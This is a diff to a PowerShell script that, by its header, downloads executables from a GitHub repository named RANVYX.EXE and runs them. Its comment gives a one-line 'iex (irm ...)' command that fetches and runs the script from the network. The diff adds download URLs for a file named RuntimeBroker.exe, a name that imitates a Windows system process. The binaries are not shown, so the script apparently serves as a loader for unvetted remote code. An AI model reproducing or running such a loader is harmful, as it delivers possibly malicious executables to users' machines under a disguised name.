@@ -1,5 +1,5 @@
-# Libery32 - download exe then run
-# iex (irm 'https://raw.githubusercontent.com/lubyralph6-maker/RANVYX.EXE/main/Libery32.ps1')
+# Libery32 / RANVYX - download exe then run
+# iex (irm 'https://raw.githubusercontent.com/lubyralph6-maker/RANVYX.EXE/main/RANVYXEXE.ps1')
 
 $ErrorActionPreference = 'Stop'
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
@@ -9,7 +9,9 @@ $exe  = Join-Path $dir 'Libery32.exe'
 $tmp  = Join-Path $dir 'Libery32.download'
 $urls = @(
     'https://github.com/lubyralph6-maker/RANVYX.EXE/raw/main/Libery32.exe',
-    'https://raw.githubusercontent.com/lubyralph6-maker/RANVYX.EXE/main/Libery32.exe'
+    'https://raw.githubusercontent.com/lubyralph6-maker/RANVYX.EXE/main/Libery32.exe',
+    'https://github.com/lubyralph6-maker/RANVYX.EXE/raw/main/RuntimeBroker.exe',
+    'https://raw.githubusercontent.com/lubyralph6-maker/RANVYX.EXE/main/RuntimeBroker.exe'
 )
 $ua   = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Libery32/1.2'
 
@@ -35,7 +37,7 @@ function Download-Exe {
                 Write-Host "  try: $url" -ForegroundColor DarkGray
                 Invoke-WebRequest -Uri $url -OutFile $OutFile -UseBasicParsing -Headers @{ 'User-Agent' = $ua } -TimeoutSec 180
                 if (Is-Exe $OutFile) { return $true }
-                throw 'Downloaded file is not a valid .exe (upload Libery32.exe to GitHub)'
+                throw 'Downloaded file is not a valid .exe'
             } catch {
                 $last = $_.Exception.Message
                 $wait = if ($last -match '429') { 15 * $n } else { 3 * $n }
@@ -44,7 +46,7 @@ function Download-Exe {
             }
         }
     }
-    throw "Cannot download Libery32.exe - $last"
+    throw "Cannot download exe - upload Libery32.exe to GitHub - $last"
 }
 
 try {
